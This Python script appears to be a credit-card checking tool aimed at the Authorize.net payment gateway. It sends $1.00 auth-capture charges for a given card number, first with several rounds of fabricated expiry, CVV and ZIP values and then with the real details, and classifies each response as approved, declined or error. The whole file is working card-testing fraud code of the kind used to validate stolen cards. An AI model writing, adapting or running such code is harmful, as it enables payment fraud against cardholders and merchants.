#!/usr/bin/env python3
import re
import time
import xml.etree.ElementTree as ET
import requests

from _common import cli_args, parse_cc, fake_creds, emit, log

API_LOGIN_ID = "YOUR_API_LOGIN_ID"
TRANSACTION_KEY = "YOUR_TRANSACTION_KEY"
SANDBOX = True
URL = "https://apitest.authorize.net/xml/v1/request.api" if SANDBOX else "https://api.authorize.net/xml/v1/request.api"

_TEMPLATE = """<?xml version="1.0" encoding="utf-8"?>
<createTransactionRequest xmlns="AnetApi/xml/v1/schema/AnetApiSchema.xsd">
  <merchantAuthentication>
    <name>{login}</name>
    <transactionKey>{key}</transactionKey>
  </merchantAuthentication>
  <transactionRequest>
    <transactionType>authCaptureTransaction</transactionType>
    <amount>1.00</amount>
    <payment>
      <creditCard>
        <cardNumber>{num}</cardNumber>
        <expirationDate>{exp}</expirationDate>
        <cardCode>{cvv}</cardCode>
      </creditCard>
    </payment>
    <billTo><zip>{zip}</zip></billTo>
  </transactionRequest>
</createTransactionRequest>
"""


def _strip_ns(xml_text):
    return re.sub(r'\sxmlns(:\w+)?="[^"]+"', "", xml_text)


def attempt(number, mm, yy, cvv, zip_code):
    body = _TEMPLATE.format(login=API_LOGIN_ID, key=TRANSACTION_KEY, num=number, exp=f"{mm}/{yy}", cvv=cvv, zip=zip_code)
    try:
        r = requests.post(URL, data=body.encode("utf-8"), headers={"Content-Type": "application/xml"}, timeout=12)
        clean = _strip_ns(r.text)
        root = ET.fromstring(clean)
        result = root.find(".//messages/resultCode")
        code = root.find(".//messages/message/code")
        text = root.find(".//messages/message/text")
        direct = root.find(".//directResponse")
        rc = (result.text or "").lower() if result is not None else ""
        mc = (code.text or "") if code is not None else ""
        mt = (text.text or "") if text is not None else ""
        dv = direct.text if direct is not None else ""
        if rc == "ok" and ",1," in f",{dv},":
            return "approved", dv or "ok"
        if rc == "ok" and ",2," in f",{dv},":
            return "declined", dv
        if "approved" in mt.lower():
            return "approved", mt
        if rc == "ok":
            return "approved", dv or mt or "ok"
        return ("declined" if mt else "error"), f"{mc}:{mt}"[:200]
    except requests.Timeout:
        return "timeout", "request timeout"
    except ET.ParseError as e:
        return "error", f"xml parse: {e}"
    except Exception as e:
        return "error", str(e)[:200]


def main():
    args = cli_args()
    cc = parse_cc(args.cc)
    if not cc:
        return emit("authorize", "error", 0, 0, "bad cc format")
    start = time.time()
    n = 0
    for _ in range(args.rounds):
        f = fake_creds(cc)
        s, _ = attempt(cc["number"], f["mm"], f["yy"], f["cvv"], f["zip"])
        n += 1
        log(f"[authorize] fake #{n}: {s}")
    status, raw = attempt(cc["number"], cc["mm"], cc["yy"], cc["cvv"], args.zip)
    n += 1
    log(f"[authorize] real #{n}: {status} {raw}")
    emit("authorize", status, n, time.time() - start, raw)


if __name__ == "__main__":
    main()
